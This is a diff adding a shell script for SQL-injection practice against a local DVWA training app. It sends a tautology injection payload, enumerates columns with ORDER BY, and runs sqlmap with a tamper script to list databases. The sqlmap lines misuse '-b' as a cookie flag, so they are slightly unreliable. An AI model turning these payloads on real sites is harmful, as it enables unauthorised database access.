@@ -1,0 +1,32 @@
+cd ~
+pwd
+
+grep -i PHPSESSID cookies.txt || echo "no PHPSESSID"
+grep -i security cookies.txt || echo "no security cookie"
+
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -o /tmp/sqli_normal.html
+head -n 40 /tmp/sqli_normal.html
+
+curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_inj.html
+head -n 60 /tmp/sqli_inj.html
+
+for i in {1..8}; do
+  echo -n "ORDER BY $i: "
+  curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%20ORDER%20BY%20$i--%20&Submit=Submit" \
+    | grep -i "error" >/dev/null && echo "ERROR" || echo "no error"
+done
+
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+
+sudo mysql -u dvwauser -p dvwa < /var/www/html/dvwa/dvwa/includes/dvwa_mysql.sql
+# enter dvwapass
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch --level=4 --risk=2 --dbs
+
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch --level=5 --risk=3 --tamper=space2comment --dbs
